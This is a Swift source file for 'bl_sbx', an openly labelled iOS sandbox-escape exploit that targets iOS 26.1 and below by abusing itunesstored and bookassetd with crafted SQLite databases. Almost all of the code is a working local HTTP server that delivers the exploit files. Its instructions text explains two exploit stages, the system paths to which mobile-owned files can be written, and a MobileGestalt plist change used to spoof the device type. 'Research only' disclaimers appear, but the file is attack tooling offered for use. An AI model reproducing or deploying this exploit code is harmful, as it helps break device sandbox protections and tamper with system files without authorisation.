import Foundation
import Network

/// bl_sbx: itunesstored & bookassetd Sandbox Escape
/// This exploit works on iOS 26.1 and below (patched in 26.2+)
/// It uses crafted SQLite databases to abuse download mechanisms
class BLSandboxEscape {
    static let PORT: UInt16 = 8003

    private var listener: NWListener?
    private var isRunning = false

    let filesToServe = [
        "BLDatabaseManager.sqlite",
        "downloads.28.sqlitedb",
        "iPhone13,2_26.0.1_MobileGestalt.epub",
        "iTunesMetadata.plist"
    ]

    /// Get the local IP address for the device
    static func getLocalIPAddress() -> String? {
        var address: String?
        var ifaddr: UnsafeMutablePointer<ifaddrs>?

        guard getifaddrs(&ifaddr) == 0 else { return nil }
        guard let firstAddr = ifaddr else { return nil }

        for ifptr in sequence(first: firstAddr, next: { $0.pointee.ifa_next }) {
            let interface = ifptr.pointee
            let addrFamily = interface.ifa_addr.pointee.sa_family

            if addrFamily == UInt8(AF_INET) {
                let name = String(cString: interface.ifa_name)
                if name == "en0" { // WiFi interface
                    var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                    getnameinfo(interface.ifa_addr, socklen_t(interface.ifa_addr.pointee.sa_len),
                              &hostname, socklen_t(hostname.count),
                              nil, socklen_t(0), NI_NUMERICHOST)
                    address = String(cString: hostname)
                }
            }
        }
        freeifaddrs(ifaddr)
        return address
    }

    /// Start the HTTP server to host exploit files
    func startServer() throws {
        guard !isRunning else {
            print("[BLSandboxEscape] Server already running")
            return
        }

        let params = NWParameters.tcp
        params.allowLocalEndpointReuse = true

        listener = try NWListener(using: params, on: NWEndpoint.Port(integerLiteral: BLSandboxEscape.PORT))

        listener?.stateUpdateHandler = { state in
            switch state {
            case .ready:
                print("[BLSandboxEscape] Server listening on port \(BLSandboxEscape.PORT)")
                self.isRunning = true
            case .failed(let error):
                print("[BLSandboxEscape] Server failed: \(error)")
                self.isRunning = false
            case .cancelled:
                print("[BLSandboxEscape] Server cancelled")
                self.isRunning = false
            default:
                break
            }
        }

        listener?.newConnectionHandler = { [weak self] connection in
            self?.handleConnection(connection)
        }

        listener?.start(queue: .global())
    }

    /// Stop the HTTP server
    func stopServer() {
        listener?.cancel()
        listener = nil
        isRunning = false
    }

    /// Handle incoming HTTP connections
    private func handleConnection(_ connection: NWConnection) {
        connection.start(queue: .global())

        // Read HTTP request
        connection.receive(minimumIncompleteLength: 1, maximumLength: 65536) { [weak self] data, _, _, error in
            guard let data = data,
                  let request = String(data: data, encoding: .utf8) else {
                connection.cancel()
                return
            }

            // Parse the requested file from HTTP GET request
            let lines = request.components(separatedBy: "\r\n")
            guard let firstLine = lines.first,
                  firstLine.hasPrefix("GET "),
                  let pathRange = firstLine.range(of: " ", options: .backwards) else {
                self?.sendResponse(connection: connection, statusCode: 400, body: "Bad Request")
                return
            }

            let path = String(firstLine[firstLine.index(firstLine.startIndex, offsetBy: 4)..<pathRange.lowerBound])
            let filename = path.trimmingCharacters(in: CharacterSet(charactersIn: "/"))

            if filename.isEmpty {
                // Serve index page
                self?.serveIndex(connection: connection)
            } else {
                // Serve requested file
                self?.serveFile(connection: connection, filename: filename)
            }
        }
    }

    /// Serve the index page with available files
    private func serveIndex(connection: NWConnection) {
        var html = """
        <!DOCTYPE html>
        <html>
        <head><title>BL Sandbox Escape PoC Server</title></head>
        <body>
        <h1>bl_sbx Exploit Files</h1>
        <p><strong>FOR RESEARCH PURPOSES ONLY</strong></p>
        <p>Compatible with iOS 26.1 and below (patched in iOS 26.2+)</p>
        <h2>Available Files:</h2>
        <ul>
        """

        for file in filesToServe {
            html += "<li><a href=\"/\(file)\">\(file)</a></li>\n"
        }

        html += """
        </ul>
        <h2>Instructions:</h2>
        <ol>
        <li>Ensure your iOS device is on iOS 26.1 or below</li>
        <li>Download the required files to your device</li>
        <li>Place them in the appropriate locations to trigger the exploit</li>
        </ol>
        </body>
        </html>
        """

        sendResponse(connection: connection, statusCode: 200, body: html, contentType: "text/html")
    }

    /// Serve a specific file from the Resources bundle
    private func serveFile(connection: NWConnection, filename: String) {
        guard filesToServe.contains(filename) else {
            sendResponse(connection: connection, statusCode: 404, body: "File Not Found")
            return
        }

        guard let fileURL = Bundle.main.url(forResource: filename.components(separatedBy: ".").first,
                                           withExtension: filename.components(separatedBy: ".").dropFirst().joined(separator: ".")),
              let fileData = try? Data(contentsOf: fileURL) else {
            sendResponse(connection: connection, statusCode: 500, body: "Failed to read file")
            return
        }

        print("[BLSandboxEscape] Serving \(filename) (\(fileData.count) bytes)")

        let contentType = getContentType(for: filename)
        sendResponse(connection: connection, statusCode: 200, bodyData: fileData, contentType: contentType)
    }

    /// Get MIME type for file
    private func getContentType(for filename: String) -> String {
        if filename.hasSuffix(".sqlite") || filename.hasSuffix(".sqlitedb") {
            return "application/x-sqlite3"
        } else if filename.hasSuffix(".epub") {
            return "application/epub+zip"
        } else if filename.hasSuffix(".plist") {
            return "application/x-plist"
        }
        return "application/octet-stream"
    }

    /// Send HTTP response
    private func sendResponse(connection: NWConnection, statusCode: Int, body: String, contentType: String = "text/plain") {
        let bodyData = body.data(using: .utf8) ?? Data()
        sendResponse(connection: connection, statusCode: statusCode, bodyData: bodyData, contentType: contentType)
    }

    /// Send HTTP response with binary data
    private func sendResponse(connection: NWConnection, statusCode: Int, bodyData: Data, contentType: String) {
        let statusText = statusCode == 200 ? "OK" : statusCode == 404 ? "Not Found" : "Error"
        let response = """
        HTTP/1.1 \(statusCode) \(statusText)\r
        Content-Type: \(contentType)\r
        Content-Length: \(bodyData.count)\r
        Connection: close\r
        \r

        """

        guard let headerData = response.data(using: .utf8) else {
            connection.cancel()
            return
        }

        var fullData = Data()
        fullData.append(headerData)
        fullData.append(bodyData)

        connection.send(content: fullData, completion: .contentProcessed { error in
            if let error = error {
                print("[BLSandboxEscape] Send error: \(error)")
            }
            connection.cancel()
        })
    }

    /// Get instructions for using the exploit
    static func getInstructions() -> String {
        guard let ip = getLocalIPAddress() else {
            return "Unable to determine local IP address. Ensure you're connected to WiFi."
        }

        return """
        BL Sandbox Escape Exploit (iOS ≤26.1)

        Server running at: http://\(ip):\(PORT)

        STAGE 1 - itunesstored:
        The crafted BLDatabaseManager.sqlite will be delivered to a writable container.

        STAGE 2 - bookassetd:
        The downloads.28.sqlitedb triggers download of the EPUB payload to arbitrary paths.

        This exploit can write mobile-owned files to:
        • /private/var/containers/Shared/SystemGroup/.../Library/Caches/
        • /private/var/mobile/Library/FairPlay/
        • /private/var/mobile/Media/

        The exploit modifies com.apple.MobileGestalt.plist to spoof device type.

        ⚠️ This method is for research purposes only.
        ⚠️ iOS 26.2+ has patched this vulnerability.
        """
    }
}
